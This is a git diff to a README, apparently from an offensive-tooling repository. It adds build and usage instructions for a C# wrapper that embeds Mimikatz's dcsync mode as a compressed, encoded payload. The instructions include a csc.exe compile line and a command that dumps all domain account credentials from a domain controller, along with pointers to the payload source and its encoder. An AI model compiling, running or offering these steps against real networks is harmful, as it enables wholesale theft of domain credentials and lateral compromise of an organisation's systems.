@@ -72,5 +72,21 @@ Complie:
 
 `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe PELoaderofMimikatz.cs`
 
+### DcsyncofMimikatz.cs
+
+This is the dcsync mode extracted from Mimikatz.
+
+The source code in KatzCompressed is https://github.com/3gstudent/test/blob/master/Mimkatz-dcsync.zip
+
+You can use https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/GzipandBase64.cs to generate the KatzCompressed string.
+
+Complie:
+
+`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe DcsyncofMimikatz.cs`
+
+Usage:
+
+`DcsyncofMimikatz.exe log "lsadump::dcsync /domain:test.com /all /csv" exit`
+
 ---
 
